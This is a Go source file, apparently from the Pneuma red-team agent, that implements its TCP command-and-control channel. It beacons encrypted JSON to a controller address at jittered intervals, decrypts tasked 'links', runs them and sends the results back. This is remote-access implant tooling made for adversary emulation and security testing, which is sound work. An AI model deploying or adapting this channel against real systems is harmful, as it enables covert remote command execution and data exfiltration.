package sockets

import (
	"bytes"
	"encoding/json"
	"io"
	"net"

	"github.com/preludeorg/pneuma/util"
)

type TCP struct{}

func init() {
	util.CommunicationChannels["tcp"] = TCP{}
}

func (contact TCP) Communicate(agent *util.AgentConfig, beacon util.Beacon) (util.Beacon, error) {
	for agent.Contact == "tcp" {
		conn, err := net.Dial("tcp", agent.Address)
		if err != nil {
			util.DebugLogf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
		} else {
			bufferedSend(conn, beacon)
		}
		jitterSleep(agent.Sleep, "TCP")
	}
	return beacon, nil
}

func respond(conn net.Conn, beacon util.Beacon, message string, agent *util.AgentConfig) {
	var tempB util.Beacon
	if err := json.Unmarshal([]byte(util.Decrypt(message)), &tempB); err == nil {
		beacon.Links = beacon.Links[:0]
		runLinks(&tempB, &beacon, agent, "\r\n")
	}
	refreshBeacon(agent, &beacon)
	bufferedSend(conn, beacon)
}

func bufferedSend(conn net.Conn, beacon util.Beacon) {
	data, _ := json.Marshal(beacon)
	allData := bytes.NewReader(append(util.Encrypt(data), "\n"...))
	sendBuffer := make([]byte, 1024)
	for {
		_, err := allData.Read(sendBuffer)
		if err == io.EOF {
			return
		}
		if _, err = conn.Write(sendBuffer); err != nil {
			util.DebugLog(err)
		}
	}
}
